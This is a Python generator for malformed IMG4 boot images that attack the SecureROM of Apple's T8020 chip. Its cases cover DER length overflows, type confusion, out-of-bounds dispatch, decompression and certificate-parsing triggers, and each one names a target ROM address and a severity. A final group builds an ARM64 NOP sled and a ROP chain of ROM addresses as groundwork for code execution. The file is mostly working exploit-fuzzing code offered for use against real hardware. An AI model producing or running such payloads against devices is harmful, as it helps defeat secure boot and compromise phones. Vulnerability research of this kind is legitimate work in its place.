#!/usr/bin/env python3
"""
T8020 B1 SecureROM — IMG4-Wrapped Payload Generator (Phase 2)
================================================================
Phase 1 payloads were raw DER — the SecureROM early-rejects them at depth 1
because they lack the IMG4 magic structure. They all get stuck in
dfuMANIFEST-WAIT-RESET with identical timing (115ms).

Phase 2 wraps vulnerability payloads inside valid IMG4 containers:
  SEQUENCE { IA5"IMG4", IM4P{...}, [0] IM4M{...} }

This ensures the parser reaches depth 3-6 where the real vulnerabilities are:
  - MEMCPY_UNCHECKED_SIZE at 0x100005784/0x100005AB0
  - UNBOUNDED_RECURSION at 0x10000D584  
  - DER_LENGTH OVERFLOW in DER region 0x10000D000+
  - Dispatch table OOB at 0x1000211A0
  - Certificate chain parsing at 0x100012000+

Each payload has depth ≤ 6 at the container level, but exploits bugs in the
inner parser once the initial IMG4/IM4P/IM4M validation passes.
"""

import struct, os, json, hashlib
from pathlib import Path

OUTPUT_DIR = Path(__file__).parent / "test_payloads_img4"
OUTPUT_DIR.mkdir(exist_ok=True)

# ============================================================================
# DER Builder (same as phase 1)
# ============================================================================
class D:
    @staticmethod
    def length(size):
        if size < 0x80:
            return bytes([size])
        elif size < 0x100:
            return bytes([0x81, size])
        elif size < 0x10000:
            return bytes([0x82, (size >> 8) & 0xFF, size & 0xFF])
        elif size < 0x1000000:
            return bytes([0x83, (size >> 16) & 0xFF, (size >> 8) & 0xFF, size & 0xFF])
        else:
            return bytes([0x84, (size >> 24) & 0xFF, (size >> 16) & 0xFF,
                         (size >> 8) & 0xFF, size & 0xFF])

    @staticmethod
    def sequence(contents):
        data = b''.join(contents) if isinstance(contents, (list, tuple)) else contents
        return b'\x30' + D.length(len(data)) + data

    @staticmethod
    def set_of(contents):
        data = b''.join(contents) if isinstance(contents, (list, tuple)) else contents
        return b'\x31' + D.length(len(data)) + data

    @staticmethod
    def octet_string(data):
        return b'\x04' + D.length(len(data)) + data

    @staticmethod
    def ia5_string(text):
        data = text.encode('ascii') if isinstance(text, str) else text
        return b'\x16' + D.length(len(data)) + data

    @staticmethod
    def integer(value, width=None):
        if width:
            data = value.to_bytes(width, 'big', signed=value < 0)
        else:
            if value == 0:
                data = b'\x00'
            elif value > 0:
                bl = (value.bit_length() + 8) // 8
                data = value.to_bytes(bl, 'big')
            else:
                bl = (value.bit_length() + 9) // 8
                data = value.to_bytes(bl, 'big', signed=True)
        return b'\x02' + D.length(len(data)) + data

    @staticmethod
    def boolean(val):
        return b'\x01\x01' + (b'\xFF' if val else b'\x00')

    @staticmethod
    def context_tag(num, contents, constructed=True):
        cls = 0xA0 if constructed else 0x80
        data = b''.join(contents) if isinstance(contents, (list, tuple)) else contents
        return bytes([cls | (num & 0x1F)]) + D.length(len(data)) + data

    @staticmethod
    def raw_tlv(tag_byte, length_bytes, value):
        return bytes([tag_byte]) + bytes(length_bytes) + value

# ============================================================================
# IMG4 Container Builders
# ============================================================================
def build_im4p(component=b"illb", desc=b"iBoot", data=b"\x00"*16):
    return D.sequence([
        D.ia5_string("IM4P"),
        D.ia5_string(component),
        D.ia5_string(desc),
        D.octet_string(data),
    ])

def build_im4m_minimal():
    """Minimal IM4M that looks structurally valid."""
    props = D.sequence([
        D.ia5_string("MANP"),
        D.set_of([
            D.sequence([D.ia5_string("CHIP"), D.integer(0x8020)]),
            D.sequence([D.ia5_string("ECID"), D.integer(0)]),
        ]),
    ])
    return D.sequence([
        D.ia5_string("IM4M"),
        D.integer(0),
        D.set_of(props),
    ])

def build_img4(im4p, im4m=None):
    parts = [D.ia5_string("IMG4"), im4p]
    if im4m is not None:
        parts.append(D.context_tag(0, im4m))
    return D.sequence(parts)

def img4_with_payload(payload_data, with_manifest=True):
    """Wrap raw payload bytes inside a valid IMG4 > IM4P > OCTET STRING."""
    im4p = build_im4p(data=payload_data)
    im4m = build_im4m_minimal() if with_manifest else None
    return build_img4(im4p, im4m)

def img4_with_raw_im4p(raw_im4p_body, with_manifest=True):
    """IMG4 container where IM4P body is raw (potentially malformed)."""
    im4p = b'\x30' + D.length(len(raw_im4p_body)) + raw_im4p_body
    im4m = build_im4m_minimal() if with_manifest else None
    return build_img4(im4p, im4m)

def img4_with_raw_manifest(im4p, raw_manifest):
    """IMG4 with valid IM4P but raw (malformed) manifest."""
    return D.sequence([
        D.ia5_string("IMG4"),
        im4p,
        D.context_tag(0, raw_manifest),
    ])

# ============================================================================
# Test Cases
# ============================================================================
test_cases = []

def reg(name, payload, desc, target, severity, vuln_type):
    fname = f"img4_{len(test_cases):03d}_{name}.bin"
    fpath = OUTPUT_DIR / fname
    # Truncate to DFU max if needed (multi-block not supported in our tester)
    if len(payload) > 0x800:
        payload = payload[:0x800]
    fpath.write_bytes(payload)
    tc = {
        "id": len(test_cases), "name": name, "file": fname,
        "size": len(payload),
        "sha256": hashlib.sha256(payload).hexdigest(),
        "description": desc, "target_function": target,
        "severity": severity, "vuln_type": vuln_type,
        "hex_preview": payload[:64].hex(),
    }
    test_cases.append(tc)
    print(f"  [{tc['id']:3d}] {severity:8s} {name:45s} ({len(payload):5d}B) -> {target}")
    return tc

# ============================================================================
# Category A: Integer overflow in DER length INSIDE IMG4 container
# ============================================================================
print("\n=== A: DER Length Overflow (inside IMG4) ===\n")

# A0: IM4P with OCTET STRING claiming 0xFFFFFFFF bytes
# The IM4P header is valid, but the payload OCTET STRING has overflowed length
im4p_body = (D.ia5_string("IM4P") + D.ia5_string("illb") + D.ia5_string("iBoot")
             + b'\x04\x84\xFF\xFF\xFF\xFF' + b'\x00' * 64)
reg("im4p_octet_len_max32", img4_with_raw_im4p(im4p_body),
    "IM4P with OCTET STRING length=0xFFFFFFFF. Parser does memcpy(dst, src, 0xFFFFFFFF) "
    "or treats as signed -1. Targets MEMCPY_UNCHECKED_SIZE at 0x100005784.",
    "0x100005784", "CRITICAL", "INTEGER_OVERFLOW")

# A1: IM4P OCTET STRING length = 0x80000000 (MSB set → negative if signed)
im4p_body = (D.ia5_string("IM4P") + D.ia5_string("illb") + D.ia5_string("iBoot")
             + b'\x04\x84\x80\x00\x00\x00' + b'\x00' * 64)
reg("im4p_octet_len_signed", img4_with_raw_im4p(im4p_body),
    "IM4P OCTET STRING length=0x80000000. If used in signed comparison (cmp w, #0) "
    "it appears negative → bypass size checks. Targets WIDTH_TRUNCATION_CMP.",
    "0x100005784", "CRITICAL", "SIGNEDNESS")

# A2: IM4P OCTET STRING with 8-byte length (0x88) wrapping to small value
im4p_body = (D.ia5_string("IM4P") + D.ia5_string("illb") + D.ia5_string("iBoot")
             + bytes([0x04, 0x88, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x40])
             + b'\x00' * 80)
reg("im4p_octet_len_64bit", img4_with_raw_im4p(im4p_body),
    "IM4P OCTET STRING with 8-byte length (0x88). 64-bit value = 0x100000040. "
    "If truncated to 32-bit → 0x40 (64 bytes). Parser reads 64B but structure thinks 4GB.",
    "0x10000D000+", "CRITICAL", "INTEGER_OVERFLOW")

# A3: IM4P OCTET STRING length = 5 bytes (0x85), truncation to 32-bit
im4p_body = (D.ia5_string("IM4P") + D.ia5_string("illb") + D.ia5_string("iBoot")
             + bytes([0x04, 0x85, 0x01, 0x00, 0x00, 0x00, 0x40])
             + b'\x00' * 80)
reg("im4p_octet_len_5byte", img4_with_raw_im4p(im4p_body),
    "5-byte DER length in IM4P OCTET STRING. Value=0x0100000040 → truncated to 0x40.",
    "0x10000D000+", "CRITICAL", "INTEGER_OVERFLOW")

# A4: Outer IMG4 SEQUENCE claims more bytes than available
# Build valid inner, but lie about outer length
im4p = build_im4p(data=b'\x00'*32)
inner = D.ia5_string("IMG4") + im4p
# Claim 0x7F0 bytes but only provide ~80
payload = b'\x30\x82\x07\xF0' + inner + b'\x00' * 100
reg("img4_outer_overlen", payload,
    "IMG4 outer SEQUENCE claims 0x7F0 bytes but only ~180 present. "
    "Parser may read beyond buffer into heap/stack data.",
    "0x10000D000+", "HIGH", "BUFFER_OVERREAD")

# ============================================================================
# Category B: Malformed IM4P inner structures
# ============================================================================
print("\n=== B: Malformed IM4P Structures ===\n")

# B0: IM4P with wrong magic — "IM4X" instead of "IM4P"
im4p_body = D.ia5_string("IM4X") + D.ia5_string("illb") + D.ia5_string("iBoot") + D.octet_string(b'\x00'*32)
reg("im4p_wrong_magic", img4_with_raw_im4p(im4p_body),
    "IM4P with magic 'IM4X'. Tests magic check at 0x10000A7D4 — if parser continues "
    "despite wrong magic, subsequent parsing assumes IM4P layout.",
    "0x10000A7D4", "MEDIUM", "MISSING_VALIDATION")

# B1: IM4P with 0-length component tag
im4p_body = (D.ia5_string("IM4P") + b'\x16\x00'  # IA5String length=0
             + D.ia5_string("iBoot") + D.octet_string(b'\x00'*32))
reg("im4p_empty_component", img4_with_raw_im4p(im4p_body),
    "IM4P with empty component tag (IA5String len=0). Strcmp with 'illb'/'ibot' etc "
    "on zero-length string may read past NUL.",
    "0x10000A7D4+", "HIGH", "BOUNDARY_CONDITION")

# B2: IM4P with oversized component tag (256 bytes, fills buffer)
big_tag = b'A' * 256
im4p_body = D.ia5_string("IM4P") + D.ia5_string(big_tag) + D.ia5_string("iBoot") + D.octet_string(b'\x00'*16)
reg("im4p_huge_component", img4_with_raw_im4p(im4p_body),
    "256-byte component tag. If copied to fixed buffer → stack overflow. "
    "Targets memcpy_safe paths at 0x100005780.",
    "0x100005780", "CRITICAL", "BUFFER_OVERFLOW")

# B3: IM4P with component causing dispatch OOB
# Tag value > table size at 0x1000211A0 
# Use a 4-byte tag that when interpreted as dispatch index → OOB
im4p_body = D.ia5_string("IM4P") + D.ia5_string(b'\xFF\xFF\xFF\xFF') + D.ia5_string("iBoot") + D.octet_string(b'\x00'*16)
reg("im4p_dispatch_oob", img4_with_raw_im4p(im4p_body),
    "Component tag 0xFFFFFFFF. If used as index into dispatch table at 0x1000211A0 → "
    "reads function pointer from arbitrary memory.",
    "0x1000211A0", "CRITICAL", "OOB_DISPATCH")

# B4: IM4P missing OCTET STRING (only 2 IA5Strings instead of 3+OCTET)
im4p_body = D.ia5_string("IM4P") + D.ia5_string("illb")
reg("im4p_truncated", img4_with_raw_im4p(im4p_body),
    "IM4P with only magic + component, no description or payload. Parser expects "
    "4 elements but gets 2 → reads past structure.",
    "0x10000A7D4+", "HIGH", "TRUNCATED_STRUCT")

# B5: IM4P with OCTET STRING replaced by SEQUENCE (type confusion)
im4p_body = (D.ia5_string("IM4P") + D.ia5_string("illb") + D.ia5_string("iBoot")
             + D.sequence([D.integer(0x41414141)]))  # SEQUENCE instead of OCTET STRING
reg("im4p_type_confusion", img4_with_raw_im4p(im4p_body),
    "IM4P with SEQUENCE where OCTET STRING expected. Parser casts to byte buffer "
    "but data starts with SEQUENCE header → pointer/length confusion.",
    "0x10000A7D4+", "HIGH", "TYPE_CONFUSION")

# B6: IM4P with extra 5th element (keybag) that's oversized
im4p_body = (D.ia5_string("IM4P") + D.ia5_string("illb") + D.ia5_string("iBoot")
             + D.octet_string(b'\x00'*16)
             + D.octet_string(b'\x42'*512))  # oversized keybag
reg("im4p_oversized_keybag", img4_with_raw_im4p(im4p_body),
    "IM4P with oversized 5th element (keybag, 512B). AES unwrap code may use "
    "fixed buffer for key material → overflow.",
    "0x100019000+", "HIGH", "BUFFER_OVERFLOW")

# ============================================================================
# Category C: Malformed IM4M (manifest) structures  
# ============================================================================
print("\n=== C: Malformed IM4M Structures ===\n")

im4p_valid = build_im4p(data=b'\x00'*32)

# C0: IM4M with MANP CHIP value = 0xFFFFFFFF (not 0x8020)
bad_props = D.sequence([
    D.ia5_string("MANP"),
    D.set_of([
        D.sequence([D.ia5_string("CHIP"), D.integer(0xFFFFFFFF)]),
        D.sequence([D.ia5_string("ECID"), D.integer(0)]),
    ]),
])
bad_manifest = D.sequence([D.ia5_string("IM4M"), D.integer(0), D.set_of(bad_props)])
reg("im4m_chip_overflow", img4_with_raw_manifest(im4p_valid, bad_manifest),
    "IM4M with CHIP=0xFFFFFFFF. If CHIP used as array index or compared with "
    "truncation → bypass or OOB.",
    "0x100004CB8", "HIGH", "INTEGER_OVERFLOW")

# C1: IM4M with negative version
bad_manifest = D.sequence([D.ia5_string("IM4M"), D.integer(-1), D.set_of(D.sequence([D.integer(0)]))])
reg("im4m_neg_version", img4_with_raw_manifest(im4p_valid, bad_manifest),
    "IM4M version = -1. Signed/unsigned confusion in version comparison.",
    "0x100004CB8", "MEDIUM", "SIGNEDNESS")

# C2: IM4M with huge MANP SET (fills DFU buffer)
huge_set_inner = b'\x00' * 0x600
bad_props = D.sequence([D.ia5_string("MANP"), D.set_of(huge_set_inner)])
bad_manifest = D.sequence([D.ia5_string("IM4M"), D.integer(0), D.set_of(bad_props)])
payload = img4_with_raw_manifest(im4p_valid, bad_manifest)
reg("im4m_huge_manp", payload,
    "IM4M with MANP SET containing 0x600 bytes. Forces manifest parser to iterate "
    "many properties → potential stack exhaustion or OOB.",
    "0x100004CB8", "HIGH", "BUFFER_OVERREAD")

# C3: IM4M with nested SEQUENCEs inside MANP (depth amplification inside container)
# Total container depth is 6 (IMG4>IM4M>[0]>SET>MANP>SET) so we add 4 more inside
inner = D.integer(0x8020)
for _ in range(4):
    inner = D.sequence(inner)
bad_props = D.sequence([D.ia5_string("MANP"), D.set_of(inner)])
bad_manifest = D.sequence([D.ia5_string("IM4M"), D.integer(0), D.set_of(bad_props)])
reg("im4m_nested_manp", img4_with_raw_manifest(im4p_valid, bad_manifest),
    "IM4M with 4 extra nesting levels inside MANP. Container=6 + inner=4 → total 10. "
    "Targets UNBOUNDED_RECURSION at 0x10000D584 from within manifest parsing.",
    "0x10000D584", "CRITICAL", "UNBOUNDED_RECURSION")

# C4: IM4M with property key that's not 4 bytes (wrong size for dispatch)
bad_props = D.sequence([D.ia5_string("X"), D.set_of(D.integer(0))])
bad_manifest = D.sequence([D.ia5_string("IM4M"), D.integer(0), D.set_of(bad_props)])
reg("im4m_short_propkey", img4_with_raw_manifest(im4p_valid, bad_manifest),
    "IM4M with 1-byte property key 'X'. If key compared as uint32_t → reads 3 extra bytes.",
    "0x100004CB8+", "MEDIUM", "BUFFER_OVERREAD")

# C5: IM4M with ECID crafted as oversized INTEGER (64 bytes)
big_ecid = D.sequence([D.ia5_string("ECID"), b'\x02\x40' + b'\xFF'*64])
bad_props = D.sequence([
    D.ia5_string("MANP"),
    D.set_of([
        D.sequence([D.ia5_string("CHIP"), D.integer(0x8020)]),
        big_ecid,
    ]),
])
bad_manifest = D.sequence([D.ia5_string("IM4M"), D.integer(0), D.set_of(bad_props)])
reg("im4m_huge_ecid", img4_with_raw_manifest(im4p_valid, bad_manifest),
    "IM4M with ECID as 64-byte INTEGER. If copied to uint64_t stack variable → overflow.",
    "0x100004CB8+", "CRITICAL", "BUFFER_OVERFLOW")

# C6: IM4M with 0-length SET (empty properties)
bad_manifest = D.sequence([D.ia5_string("IM4M"), D.integer(0), b'\x31\x00'])
reg("im4m_empty_props", img4_with_raw_manifest(im4p_valid, bad_manifest),
    "IM4M with empty SET (no properties). Parser iteration on empty set may underflow counter.",
    "0x100004CB8", "MEDIUM", "MISSING_VALIDATION")

# ============================================================================
# Category D: Compression payload triggers
# ============================================================================
print("\n=== D: Compression Payload Triggers ===\n")

# D0: LZFSE magic in IM4P payload
lzfse_data = b'bvx2' + b'\x00'*60  # LZFSE magic "bvx2" 
reg("im4p_lzfse_trigger", img4_with_payload(lzfse_data),
    "IM4P payload starting with LZFSE magic 'bvx2'. Triggers decompression path → "
    "malformed LZFSE header parsed with minimal data.",
    "0x10001C000+", "HIGH", "DECOMPRESSION")

# D1: LZSS magic in IM4P payload  
lzss_data = b'complzss' + struct.pack('>I', 0x100000) + b'\x00'*52  # claim 1MB decompressed
reg("im4p_lzss_trigger", img4_with_payload(lzss_data),
    "IM4P payload with LZSS magic 'complzss' claiming 1MB decompressed. "
    "Decompressor allocates based on claimed size → heap overflow if wrong.",
    "0x10001C000+", "HIGH", "DECOMPRESSION")

# D2: LZFSE with crafted block header causing OOB
lzfse_exploit = b'bvx2'
# LZFSE block header: n_raw_bytes, n_payload_bytes, n_literals, etc.
lzfse_exploit += struct.pack('<I', 0xFFFFFFFF)  # n_raw_bytes = MAX
lzfse_exploit += struct.pack('<I', 0x10)         # n_payload_bytes = small
lzfse_exploit += struct.pack('<I', 0xFFFF)       # n_literals = huge
lzfse_exploit += b'\x00' * 48
reg("im4p_lzfse_oob", img4_with_payload(lzfse_exploit),
    "LZFSE block with n_raw_bytes=0xFFFFFFFF, n_literals=0xFFFF. Decompressor "
    "writes past output buffer. Targets LZFSE decode loop.",
    "0x10001C000+", "CRITICAL", "HEAP_OVERFLOW")

# D3: Memz magic (alternate image format)
memz_data = b'Memz' + b'\x00'*60
reg("img4_memz_magic", img4_with_payload(memz_data),
    "IM4P payload with 'Memz' magic. Triggers alternate code path at 0x10000A7D4. "
    "Memz handler may have different validation than IMG4.",
    "0x10000A7D4", "HIGH", "ALTERNATE_PATH")

# ============================================================================
# Category E: Certificate / signature path fuzzing
# ============================================================================
print("\n=== E: Certificate Path Fuzzing ===\n")

# E0: IM4M with fake X.509 certificate (SEQUENCE { SEQUENCE { ... } })
fake_cert = D.sequence([
    D.sequence([  # TBSCertificate
        D.context_tag(0, D.integer(2)),  # version v3
        D.integer(0x1337),  # serial
        D.sequence([D.integer(0)]),  # signature algo (dummy)
        D.sequence([]),  # issuer (empty)
        D.sequence([]),  # validity (empty)
        D.sequence([]),  # subject (empty)
        D.sequence([D.sequence([D.integer(0)]), b'\x03\x02\x00\x00']),  # subjectPublicKeyInfo (dummy)
    ]),
    D.sequence([D.integer(0)]),  # signature algo
    b'\x03\x02\x00\x00',  # signature BitString (dummy)
])
# Put cert in IM4M where certificate chain normally goes
bad_manifest = D.sequence([
    D.ia5_string("IM4M"),
    D.integer(0),
    D.set_of(D.sequence([D.integer(0)])),
    fake_cert,  # Extra element: fake cert
])
reg("im4m_fake_cert", img4_with_raw_manifest(im4p_valid, bad_manifest),
    "IM4M with appended fake X.509 certificate. Forces cert parsing at 0x100012000+ "
    "with minimal/invalid fields → NULL deref or OOB in X.509 parser.",
    "0x100012000+", "HIGH", "CERT_PARSING")

# E1: IM4M with massive certificate (fills buffer)
big_cert = D.sequence([D.octet_string(b'\x41' * 0x500)])
bad_manifest = D.sequence([D.ia5_string("IM4M"), D.integer(0), D.set_of(D.sequence([D.integer(0)])), big_cert])
reg("im4m_huge_cert", img4_with_raw_manifest(im4p_valid, bad_manifest),
    "IM4M with oversized certificate (~1280B). DER parser walks through entire cert "
    "body → potential OOB read if cert size > manifest allocation.",
    "0x100012000+", "HIGH", "BUFFER_OVERREAD")

# ============================================================================
# Category F: IMG4 container-level attacks
# ============================================================================
print("\n=== F: Container-Level Attacks ===\n")

# F0: IMG4 with IM4P but no manifest — tests what happens at boot attempt without sig
reg("img4_no_manifest", build_img4(build_im4p(data=b'\x00'*64), im4m=None),
    "IMG4 with IM4P but no IM4M manifest. If boot proceeds without signature check → "
    "unsigned code execution. Expected: fail, but HOW it fails matters.",
    "0x10000A704", "CRITICAL", "MISSING_VALIDATION")

# F1: IMG4 with duplicate IM4P (two payloads)
im4p1 = build_im4p(component=b"illb", data=b'\x00'*16)
im4p2 = build_im4p(component=b"ibot", data=b'\x41'*16)
payload = D.sequence([D.ia5_string("IMG4"), im4p1, im4p2, D.context_tag(0, build_im4m_minimal())])
reg("img4_double_im4p", payload,
    "IMG4 with TWO IM4P payloads. Parser may use 1st for validation, 2nd for execution.",
    "0x10000A704", "HIGH", "TOCTOU")

# F2: IMG4 with extra unknown element after IM4M
payload = D.sequence([
    D.ia5_string("IMG4"),
    build_im4p(data=b'\x00'*16),
    D.context_tag(0, build_im4m_minimal()),
    D.context_tag(1, b'\x41'*256),  # [1] unknown tag
])
reg("img4_extra_context_tag", payload,
    "IMG4 with extra [1] context tag after manifest. If parser doesn't check for "
    "exactly 3 elements → extra data parsed as different structure.",
    "0x10000A704", "MEDIUM", "EXTRA_ELEMENT")

# F3: IMG4 where IA5String "IMG4" is replaced by longer string
payload = D.sequence([
    D.ia5_string("IMG4" + "\x00" * 252),  # 256-byte "IMG4..." string
    build_im4p(data=b'\x00'*16),
])
reg("img4_long_magic", payload,
    "IMG4 magic string padded to 256 bytes with NULs. If compared with strncmp(4) → passes. "
    "Extra bytes may overwrite stack during copy.",
    "0x10000A704", "HIGH", "BUFFER_OVERFLOW")

# F4: IMG4 with context tag [31] — long-form tag encoding
# [31] in constructed form = 0xBF 0x1F (multi-byte tag)
# If parser uses raw tag byte & 0x1F as index → OOB on dispatch table
payload = D.sequence([
    D.ia5_string("IMG4"),
    build_im4p(data=b'\x00'*16),
    bytes([0xBF, 0x1F]) + D.length(len(build_im4m_minimal())) + build_im4m_minimal(),
])
reg("img4_longform_context_tag", payload,
    "Manifest wrapped in long-form context tag [31] (0xBF 0x1F). Parser dispatch at "
    "0x1000211A0 uses tag & 0x1F as index → if not bounds-checked → OOB read.",
    "0x1000211A0", "CRITICAL", "OOB_DISPATCH")

# F5: IMG4 with context tag [30] — high tag number
payload = D.sequence([
    D.ia5_string("IMG4"),
    build_im4p(data=b'\x00'*16),
    bytes([0xBE]) + D.length(len(build_im4m_minimal())) + build_im4m_minimal(),
])
reg("img4_context_tag_30", payload,
    "Manifest in context tag [30] (0xBE). Parser expects [0] (0xA0) → if dispatch "
    "uses tag number as offset → reads from wrong table entry.",
    "0x1000211A0", "HIGH", "OOB_DISPATCH")

# ============================================================================
# Category G: Multi-stage exploitation setup
# ============================================================================
print("\n=== G: Multi-Stage Setups ===\n")

# G0: Valid-looking IMG4 with shellcode NOP sled in IM4P payload
nop_sled = b'\x1F\x20\x03\xD5' * 128  # ARM64 NOP (512 bytes)
reg("img4_nop_sled", img4_with_payload(nop_sled),
    "Valid IMG4 with ARM64 NOP sled (512B) as payload. If signature check bypassed "
    "or corrupted → execution enters NOP sled.",
    "0x10000A704", "CRITICAL", "CODE_EXECUTION_PREP")

# G1: IMG4 where IM4P data region contains crafted addresses
# These point to known ROM functions for ROP if we get PC control
rop_chain = b''
rop_chain += struct.pack('<Q', 0x100000000 + 0x1B58)  # ret gadget
rop_chain += struct.pack('<Q', 0x100000000 + 0xA704)  # img4_verify
rop_chain += struct.pack('<Q', 0x100000000 + 0x5480)  # img4_verify_internal
rop_chain += b'\x00' * (64 - len(rop_chain))
reg("img4_rop_addresses", img4_with_payload(rop_chain),
    "IM4P payload containing ROM function addresses as ROP gadgets. "
    "If stack corruption achieved → these addresses get loaded into PC.",
    "0x10000A704", "CRITICAL", "CODE_EXECUTION_PREP")

# ============================================================================
# Save manifest
# ============================================================================
out_manifest = {
    "generator": "img4_phase2_generator.py",
    "date": __import__('datetime').datetime.now().isoformat(),
    "target": "T8020 B1 SecureROM (CPID:8020 CPRV:11)",
    "total_cases": len(test_cases),
    "phase": 2,
    "note": "IMG4-wrapped payloads that pass initial container validation and reach deep parser",
    "severity_summary": {},
    "cases": test_cases,
}
for tc in test_cases:
    sev = tc["severity"]
    out_manifest["severity_summary"][sev] = out_manifest["severity_summary"].get(sev, 0) + 1

manifest_path = OUTPUT_DIR / "test_manifest.json"
manifest_path.write_text(json.dumps(out_manifest, indent=2))

print(f"\n{'='*70}")
print(f"Generated {len(test_cases)} IMG4-wrapped test cases in {OUTPUT_DIR}")
print(f"Severity: {out_manifest['severity_summary']}")
print(f"Manifest: {manifest_path}")
